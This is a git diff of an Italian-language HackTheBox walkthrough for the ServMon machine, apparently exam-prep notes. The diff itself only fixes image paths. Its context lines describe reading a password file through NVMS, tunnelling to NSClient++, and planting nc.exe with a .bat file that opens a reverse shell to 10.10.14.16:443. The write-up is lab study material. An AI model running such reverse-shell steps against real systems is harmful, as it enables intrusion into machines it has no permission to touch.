@@ -279,7 +279,7 @@ menter il il file `Note to do.txt`
 
 Visitano la porta 10.10.10.184:80 ci troviamo di fronte ad un from di login NVMS sembra quello di cui si parla nelle note
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon1.png)
+![](../zzz_rev/attachments/Servmon1.png)
 
 nei  primi due punti dell note che sono stati completati si parla di un cambio password e di un blocco al NSC lato client quindi non penso ci siamo credenziali di default, quindi vediamo se troviamo qualche CVE non su google
 
@@ -290,7 +290,7 @@ Perfetto la nota di Nadine parlava di un file Passwords.txt sul Desktop di Natha
 Apriamo [Burp Suite](../Note/Tool/Burp%20Suite.md) e intercettiamo una richiesta alla pagine di login, la mandiamo al repetar,
 modifichiamo il metodo di richiesta da POST a GET come segue
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon2.png)
+![](../zzz_rev/attachments/Servmon2.png)
 
 Ci ritorna delle possibili password
 
@@ -525,9 +525,9 @@ Proviamo con [Tunneling ssh](../Note/Pivoting,%20Tunneling%20and%20Port%20Forwar
 
 Ora posso accedere a https://127.0.0.1:8443/ e accedere con la password:
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon3.png)
+![](../zzz_rev/attachments/Servmon3.png)
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon4.png)
+![](../zzz_rev/attachments/Servmon4.png)
 Ora seguendo quanto scritto nella exploit
 
 scarichiamo con curl nc.exe (versione 64bit ) nella cartella Temp del target e scriviamo il file .bat
@@ -553,7 +553,7 @@ c:\Temp\nc.exe -e cmd.exe 10.10.14.16 443
 a questo punto andiamo nell interfaccia web, alla voce setting/external script/
 ne aggiungiamo uno e alla voce comando mettiamo il percorso del nostro file.bat
 
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon6.png)
+![](../zzz_rev/attachments/Servmon6.png)
 non ci resta che salvare nella voce Changes e fare il reload alla voce Control 
 >[!info]
 >spesso crasha e bisogna riavviare la macchina
@@ -568,7 +568,7 @@ listening on [any] 443 ...
 ```
 
 ci rechiamo alla sezione Queries ed diamo run, e abbiamo la nostra shell
-![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon7.png)
+![](../zzz_rev/attachments/Servmon7.png)
 
 e ci prendiamo la nostra root flag
 
